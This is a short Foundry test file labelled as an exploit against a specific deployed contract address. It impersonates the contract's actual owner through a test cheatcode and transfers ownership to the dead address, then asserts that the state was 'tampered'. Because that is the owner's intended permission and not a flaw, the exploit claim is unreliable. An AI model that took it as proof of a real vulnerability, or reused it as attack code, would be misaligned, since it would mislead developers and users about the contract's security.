// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISokenSapphireDao {
    function owner() external view returns (address);
    function transferOwnership(address newOwner_) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);
    ISokenSapphireDao target;
    address originalOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ISokenSapphireDao(TARGET);
        originalOwner = target.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(originalOwner);
        target.transferOwnership(0x000000000000000000000000000000000000dEaD);
        vm.stopPrank();
        assertEq(target.owner(), 0x000000000000000000000000000000000000dEaD, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
